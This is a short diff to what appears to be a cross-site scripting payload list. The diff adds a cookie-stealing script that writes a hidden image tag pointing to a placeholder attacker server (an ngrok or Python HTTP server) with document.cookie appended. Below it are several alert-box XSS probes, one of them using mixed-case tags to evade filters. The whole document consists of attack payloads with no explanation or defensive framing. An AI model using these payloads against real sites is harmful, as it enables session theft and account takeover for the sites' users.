@@ -1,3 +1,4 @@
+    <script>document.write('<img src="http://İpADRES NGROK , PythonSimpleHTTPSERVER/'+document.cookie+'" width=0 height=0 border=0 />');</script>
     <script>alert(123);</script>
     <ScRipT>alert("XSS");</ScRipT>
     <script>alert(123)</script>
